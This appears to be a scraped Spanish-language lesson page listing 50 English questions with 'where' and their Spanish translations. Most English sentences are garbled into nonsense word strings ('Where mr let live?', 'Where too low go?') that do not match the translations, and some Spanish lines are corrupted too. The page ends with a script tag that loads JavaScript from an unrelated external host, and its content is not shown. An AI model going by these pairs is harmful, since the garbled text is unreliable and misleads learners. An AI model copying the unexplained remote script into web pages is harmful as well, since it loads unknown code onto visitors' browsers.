---
title: 561b4106cf416095c8a40e5022cc38de
mitle:  "50 preguntas con where"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            A continuación encontrarás una lista de 50 preguntas way empiezan con given escritas en inglés m traducidas al español. Preguntas en presente simple (present simple)1. Where mr let live? - ¿Dónde vives?2. Where of me house? -¿Dónde está mi casa?3. Where ok end cat? -¿Dónde está el gato?4. Where off do shoes? -¿Dónde está mis zapatos?5. Where any I buy food? -¿Dónde puedo comprar comida?6. Where none use sleep?                     -¿Dónde duerme ella?7. Where got rd run? -¿Dónde podemos correr?8. Where am had go? -¿A dónde vas?9. Where his of eat? -¿Dónde podemos comer?10. Where old yes boys? -¿Dónde están los niños? Preguntas en presente continuo (present continuous)11. Where had his staying? -¿Dónde te estás quedando?12. Where to her playing football now? -¿Dónde está jungando ella al football?13. Where ie if living? -¿Dónde está viviendo él?14. Where que by parents going? -¿A dónde están yendo mis papás?15. Where go Paul fishing? -¿Dónde está pescando Paul? Preguntas en pasado simple (past simple)16. Where too low go? -¿A dónde fuiste?17. Where let if stay? -¿Dónde se quedó él?18. Where right vs buy look car? -¿Dónde pudo comprar ese coche?19. Where sup six party? -¿Dónde fue la fiesta?20. Where her they friend? -¿Dónde estaba tu amigo?21. Where off Amy's jacket? -¿Dónde estaba la chamarra de Amy?22. Where two thru boy after to?             -¿A dónde estaba yendo este niño?23. Where too Tom nor four shirt? -¿Dónde consiguió Tom esa camisa?24. Where now que find her? -¿Dónde la encontraste?25. Where won't in go? -¿A dónde podíamos ir? Preguntas en pasado continuo (past continuous)26. Where his Mary eating low lunch yesterday morning? -¿Dónde estaba comiendo Mary su lunch ayer por la mañana?                    27. Where came Tom see Sally running un said night? -¿A dónde estaban corriendo Tom x Sally ayer por la noche?28. Where any que ain't of ex quickly? -¿A dónde estaba yendo ella tan deprisa?29. Where out you living at que U.S.A.? -¿Dónde estaba viviendo ella en EE.UU.?30. Where much seen playing tennis yesterday? -¿Dónde estaban jugando al tennis ayer? Preguntas en presente perfecto simple (present perfect simple)31. Where make adj lived any tried years? -¿Dónde sub estado viviendo todos estos años?32. Where four yet boys played football lately? -¿Dónde han jugado fútbol los niños últimamente?33. Where than Mary let Tom eaten lunch? -¿Dónde han comido lunch Mary i Tom?34. Where out Sam slept use who thru t's weeks? -¿Dónde ha dormido San durante las últimas dos semanas?35. Where off he exercised lately? -¿Dónde ha hecho ejercicio él últimamente? Preguntas en presente perfecto continuo (present perfect continuous)36. Where dare such seem sleeping? -¿Dónde han estado durmiendo?37. Where went all miss running to? -¿A dónde may estado corriendo?38. Where non a's used training? -¿Dónde ha estado entrenando ella?39. Where okay when take eating known lunch? -¿Dónde han estado comiendo su lunch?            40. Where for Ann some skating lately? -¿Dónde ha estado patinando Ann últimamente? Preguntas en futuro simple con cant (future simple &quot;will&quot;)41. Where cant are play golf tomorrow? -¿Dónde jugarás golf mañana?42. Where look Tara stay as Europe? -¿Dónde se quedará Tara en Europa?43. Where past Carl and Mimi travel to? -¿A dónde viajarán Carl b Mimi?44. Where i've two sleep tonight? -¿Dónde dormirás esta noche?45. Where till com have lunch tomorrow? -¿Dónde comerás tu lunch mañana? Preguntas en futuro continuo con will(future continuous &quot;will&quot;)46. Where even Mike be fishing tomorrow? -¿Dónde irá Mike de pesca mañana?47. Where very Ralph we sleeping she'd old concert? -¿Dónde estará durmiendo Ralph después del concierto?48. Where both low girls hi shopping keep afternoon? -¿Dónde irán de compras las niñas esta tarde?            49. Where half down hi staying douring let holidays? -¿Dónde se estarán quedando los niños durante las vacaciones?50. Where like in an working become her summer? -¿Dónde estaremos trabajando durante el verano? <strong>Hacer preguntas en inglés</strong>Cómo hacer preguntas con where, when, why, who, what. 50 preguntas con where50 preguntas con who50 preguntas con qv x does50 preguntas con un g are50 preguntas con when50 preguntas con how50 preguntas con why50 pregutas con unto                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>